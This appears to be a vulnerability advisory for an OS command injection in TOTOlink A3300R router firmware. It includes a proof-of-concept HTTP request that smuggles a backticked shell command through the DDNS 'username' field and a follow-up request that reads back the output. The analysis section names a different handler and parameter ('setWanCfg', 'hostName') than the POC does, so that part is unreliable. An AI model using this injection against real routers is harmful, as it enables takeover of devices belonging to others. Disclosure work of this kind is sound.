# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](D:\typora 图片\image-20240109124617070.png)

## Vulnerability Description

When deal with  `setDdnsCfg` request,`username` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=12B107C61AD15CFD HTTP/1.1
Host: itotolink.net
Content-Length: 134
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/ddns.html?token=12B107C61AD15CFD
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: ext_pgvwcount=-0.1
Connection: close

{"enable":"1","provider":"3322.org","domain":"8.8.8.8","username":"admin`ls>/web/234.txt`","password":"admin","topicurl":"setDdnsCfg"}
```

injection the command "ls>/web/234.txt"

![image-20240109130442174](D:\typora 图片\image-20240109130442174.png)

check the result.

```
GET /234.txt HTTP/1.1
Host: itotolink.net
If-Modified-Since: Mon, 24 Oct 2022 17:43:03 GMT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://itotolink.net/static/css/advance_menu.css
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: ext_pgvwcount=-0.1
Connection: close
```

![image-20240109130507028](D:\typora 图片\image-20240109130507028.png)

## Analysis

sub_40E920 will handle the `setWanCfg` request. sub_40E920 get `hostName` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240109130751395](D:\typora 图片\image-20240109130751395.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](D:\typora 图片\image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](D:\typora 图片\image-20240109131330610.png)